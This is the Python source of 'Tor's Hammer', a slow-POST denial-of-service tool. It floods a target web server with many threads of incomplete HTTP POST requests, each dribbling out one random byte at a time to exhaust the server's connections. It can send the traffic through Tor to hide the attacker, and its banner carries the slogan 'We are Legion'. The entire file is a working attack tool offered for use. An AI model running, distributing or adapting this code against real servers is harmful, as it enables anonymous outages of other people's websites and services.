import os
import re
import time
import sys
import random
import math
import getopt
import socks
import string

from threading import Thread

global stop_now

stop_now = False

useragents = [ "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0" ]

class httpPost(Thread):
    def __init__(self, host, port, tor):
        Thread.__init__(self)
        self.host = host
        self.port = port
        self.socks = socks.socksocket()
        self.tor = tor
        self.running = True
		
    def _send_http_post(self, pause=10):
        global stop_now

        self.socks.send("POST / HTTP/1.1\r\n"
                        "Host: %s\r\n"
                        "User-Agent: %s\r\n"
                        "Connection: keep-alive\r\n"
                        "Keep-Alive: 900\r\n"
                        "Content-Length: 10000\r\n"
                        "Content-Type: application/x-www-form-urlencoded\r\n\r\n" %
                        (self.host, random.choice(useragents)))

        for i in range(0, 9999):
            if stop_now:
                self.running = False
                break
            p = random.choice(string.letters+string.digits)
            print ("Posting: %s")
            self.socks.send(p)
            time.sleep(random.uniform(0.1, 3))
	
        self.socks.close()
		
    def run(self):
        while self.running:
            while self.running:
                try:
                    if self.tor:
                        self.socks.setproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)
                    self.socks.connect((self.host, self.port))
                    print ("Connected to host...")
                    break
                except Exception as e:
                    if e.args[0] == 106 or e.args[0] == 60:
                        break
                    print ("Error connecting to host...")
                    time.sleep(1)
                    continue
	
            while self.running:
                try:
                    self._send_http_post()
                except Exception as e:
                    if e.args[0] == 32 or e.args[0] == 104:
                        print ("Thread broken, restarting...")
                        self.socks = socks.socksocket()
                        break
                    time.sleep(0.1)
                    pass
 
def usage():
    print("./torshammer.py -t <target> [-r <threads> -p <port> -T -h]")
    print(" -t|--target <Hostname|IP>")
    print(" -r|--threads <Number of threads> Defaults to 256")
    print(" -p|--port <Web Server Port> Defaults to 80")
    print(" -T|--tor Enable anonymising through tor on 127.0.0.1:9050")
    print(" -h|--help Shows this help\n") 
    print("Eg. ./torshammer.py -t 192.168.1.100 -r 256\n")

def main(argv):
    
    try:
        opts, args = getopt.getopt(argv, "hTt:r:p:", ["help", "tor", "target=", "threads=", "port="])
    except getopt.GetoptError:
        usage() 
        sys.exit(-1)

    global stop_now
	
    target = ''
    threads = 256
    tor = False
    port = 80

    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
            sys.exit(0)
        if o in ("-T", "--tor"):
            tor = True
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-r", "--threads"):
            threads = int(a)
        elif o in ("-p", "--port"):
            port = int(a)

    if target == '' or int(threads) <= 0:
        usage()
        sys.exit(-1)

    print ("/*")
    print (" * Target: %s Port: %d" % (target, port))
    print (" * Threads: %d Tor: %s" % (threads, tor))
    print (" * Give 20 seconds without tor or 40 with before checking site")
    print (" */")

    rthreads = []
    for i in range(threads):
        t = httpPost(target, port, tor)
        rthreads.append(t)
        t.start()

    while len(rthreads) > 0:
        try:
            rthreads = [t.join(1) for t in rthreads if t is not None and t.isAlive()]
        except KeyboardInterrupt:
            print ("\nShutting down threads...\n")
            for t in rthreads:
                stop_now = True
                t.running = False

if __name__ == "__main__":
    print ("\n/*")
    print (" * Tor's Hammer ")
    print (" * Slow POST DoS Testing Tool")
    print (" * lidarbtc@protonmail.com")
    print (" * Anon-ymized via Tor")
    print (" * We are Legion.")
    print (" */\n")

    main(sys.argv[1:])

